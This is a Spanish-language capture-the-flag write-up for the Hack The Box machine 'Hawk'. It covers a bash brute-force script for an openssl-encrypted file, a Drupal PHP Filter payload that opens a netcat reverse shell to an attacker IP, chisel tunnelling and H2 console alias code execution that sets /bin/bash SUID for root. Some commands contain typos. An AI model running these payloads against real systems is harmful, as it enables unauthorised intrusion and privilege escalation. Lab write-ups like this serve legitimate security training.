---
layout: post
title: HTB_Hawk
date: 2023/07/10
slug: HTB_Hawk
heroImage: /assets/machines.jpg
---

# Hawk {-}

## Introduccion {-}

La maquina del dia 05/08/2021 se llama Hawk
.

El replay del live se puede ver aqui

[![S4vitaar Hawk maquina](https://img.youtube.com/vi/lL1_9JiUy-k/0.jpg)](https://www.youtube.com/watch?v=lL1_9JiUy-k)

No olvideis dejar un like al video y un comentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.102
```
ttl: 63 -> maquina Linux. 
Recordar que en cuanto a ttl se trata 64 = linux y 128 = windows. 
Pero como estamos en hackthebox el ttl disminuye en una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.102 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,5000 10.10.10.102 -oN targeted
```

| Puerto | Servicio     | Que se nos occure?    | Que falta?   |
| ------ | ------------ | --------------------- | ------------ |
| 21     | ftp          | Accesso por anonymous |              |
| 22     | ssh          | Accesso directorio    | Credenciales |
| 80     | http         | Web, fuzzing          |              |
| 5435   | tcpwrapped   |                       |              |
| 8082   | http         | Web, fuzzing          |              |
| 9092   | XmlIpcRegSvc |                       |              |


### Conneccion como anonymous al servicio FTP {-}

```bash
ftp 10.1.10.102
Name: anonymous
```

Mirando los ficheros con 
```bash
 ls -la 
```
 encontramos un fichero oculto llamado 
```bash
 .drupal.txt.enc 
```
. Lo descargamos en nuestra
maquina de atacante.

```bash
ls -la
cd messages
ls -la
get .drupal.txt.enc
```

### Analizando el fichero .drupal.txt.enc {-}

```bash
mv .drupal.txt.enc drupal.txt.enc
cat drupal.txt.enc
```

Aqui vemos que el contenido del fichero esta encodeado en base64.

```bash
cat drupal.txt.enc | xargs | tr -d ' ' | base64 -d; echo
```

Aqui el contenido parece ser un binario. La mejor cosa que hacer en estas situaciones seria guardarlo en un nuevo fichero

```bash
cat drupal.txt.enc | xargs | tr -d ' ' | base64 -d; echo > drupal
rm drupal.txt.enc
mv drupal dupal.txt.crypted
```

Ahora podemos mirar que typo de fichero es.

```bash
cat drupal.txt.crypted
strings drupal.txt.crypted
file drupal.txt.crypted
```

El comando file nos muestra que el fichero a sido encriptado por openssl con una contraseña.

### Desencripcion del fichero drupal.txt.crypted {-}

El problema en este caso es que para leer el fichero necesitamos:

- una contraseña
- el modo de cifrado utlizado para encriptar

Aqui tendriamos que intentar multiples modo de cifrado pero buscando por internet, vemos que el mas comun seria el 
```bash
 aes-256-cbc 
```


En modo de ejemplo, estas serian la lineas para encriptar y desencriptar un fichero con openssl:

1. Encripcion
    ```bash
    openssl aes-256-cbc -in fichero -out fichero.crypted -k password123
    ```
1. Desencripcion

    ```bash
    openssl aes-256-cbc -d -in fichero.crypted -out fichero -k password123
    ```

La idea aqui es crearnos un script 
```bash
 bruteforce.sh 
```
 que nos permite encontrar la contraseña.
## Evaluacion de vulnerabilidades {-}

### Crack ssl password {-}

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "\n[!] Saliendo...\n"
    exit 1
}

#Ctrl+C
trap ctrl_c INT

for password in $(cat /usr/share/wordlists/rockyou.txt); do
    openssl aes-256-cvc -d -in drupal.txt.crypted -out drupal.txt -k $password 2>/dev/null

    if [ "$(echo $?)" == "0" ]; then
        echo -e "\n[+] La password es $password\n"
        exit 0
    fi
done
```

Lanzamos el script y vemos la contraseña. Mirando el contenido del ficher drupal.txt vemos un mensaje con una contraseña del portal.


### Analizamos el Portal {-}

Hablando de portal, pensamos en la web. Nmap nos dio 2 puertos donde el servicio es http. el **80** y el **8082**
Con firefox navegamos en la web para ver lo que es. 

- El puerto 80 es el login de la aplicacion drupal
- El puerto 8082 es un H2 Console con una regla **remote connections ('webAllowOthers') are disabled**

Aqui ya pensamos en tecnicas de port forwarding para el puerto 8082 y savemos que tenemos que ir a por el puerto 80.

En el login del puerto 80 intentamos

- admin:admin
- admin:password
- admin:PencilKeyboardScanner123

Y la contraseña que hemos encontrado en el contenido del fichero 
```bash
 drupal.txt 
```
 funciona.



## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Conexion por Druppal {-}

Para ejecutar comandos o mejor dicho, para ganar accesso al sistema desde un admin panel de drupal siempre es el mismo.

1. En modules, habilitar el componente PHP Filter


![drual-hfilter](/assets/images/drupal-phpfilter.png) 
1. Crear un nuevo contenido

    ```{r, echo = FALSE, fig.cap="Drupal - Nuevo articulo", out.width="90%"}
    knitr::include_graphics("images/drupal-new-article.png")

![drual-ew-article](/assets/images/drupal-new-article.png) 
    ```bash
    nc -nlvp 443
    ```

1. En drupal añadir en el body

    ```php
    <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f"); ?>
    ```

1. En Text Format le ponemos a **PHP code**
1. Le damos al boton Preview

Ya hemos ganado accesso al sistema como el usuario *www-data*

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Analizamos la maquina {-}

```bash
ls -l
cd /home
ls
cd /daniel
cat user.txt
```

Aqui encontramos un usuario **daniel** y tenemos derechos de escritura. Ya podemos visualizar la flag. Lo mas probable aqui
seria de convertirnos directamente en el usuario root.

## Escalada de privilegios {-}

### Rootear la maquina {-}

Algo que hemos visto, es que el puerto **8082** no se podia ver por reglas definidas en el sistema.
Como ya hemos pensado en tecnicas de port forwarding, instalamos **Chisel**.

1. Descarga de chisel y build

    ```bash
    git clone https://github.com/jpillora/chisel
    cd chisel
    go build -ldflags "-w -s" .
    upx chisel
    chmod +x chisel
    ```

1. Enviamos chisel a la maquina victima

    - en la maquina de atacante

        ```bash
        python3 -m http.server 80
        ```

    - en la maquina victima

        ```bash
        cd /tmp
        wget http://10.10.14.8/chisel
        chmod +x chisel
        ```

1. En la maquina de atacante creamos un servidor 

    ```bash
    ./chisel server --reverse --port 1234
    ```

1. En la maquina victima creamos un cliente 

    ```bash
    ./chisel client 10.10.14.8:1234 R:8082:127.0.0.1:8082
    ```

Ahora en firefox si vamos a la url 
```bash
 http://localhost:8082 
```
 ya podemos ver el contenido de la web.

Si pinchamos en preferencias y despues en **Permitir conexiones desde otros ordenadores** ya podemos navegar desde la
url 
```bash
 http://10.10.10.102:8082 
```
.

Aqui vemos un mensaje Wrong user name or password. Esto puede passar si la **URL JDBC** ya esta en uso. 
si cambiamos la url 
```bash
 jdbc:h2:~/test 
```
 por 
```bash
 jdbc:h2:~/EEEEEE 
```
 y pinchamos el boton conectar, Entramos en el
panel de control H2 database.

Si en la shell buscamos con el commando 
```bash
 ps -faux 
```
 y buscamos el servicio **h2** vemos que el servicio a sido lanzado por
el usuario root. Quiere decir que si ejecutamos commandos desde la consola h2, lo lanzariamos como usuario root.

Buscamos si existe un exploit para H2 console

```bash
searchsploit h2 consola
searchsploit h2 database
```

Encontramos un exploit en python que permitiria ejecutar **Alias Arbitrary Code execution**. Lo analizamos:

```bash
searchsploit -x 44422
```

Mirando el exploit, vemos que tenemos que crear un alias en el cual podemos podemos utilizar para ejecutar commandos. En este caso
no necessitamos utilizar el exploit. Podemos copiar las partes que nos interessa en el panel H2.

```sql
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new \
java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;

CALL EXECVE('whoami')
```

Aqui vemos **root**. Pues aqui lanzamos el commando para que la 
```bash
 /bin/bash 
```
 sea SUID

```sql
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new \
java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;

CALL EXECVE('chmod 4755 /bin/bash')
```

En la shell, ya podemos comprobar que la 
```bash
 /bin/bash 
```
 es SUID y con el commando 
```bash
 bash -p 
```
 no convertimos en root

```bash
ls -l /bin/bash
bash -p
cd /root
cat root.txt
```

Y a estamos root y podemos visualizar la flag.
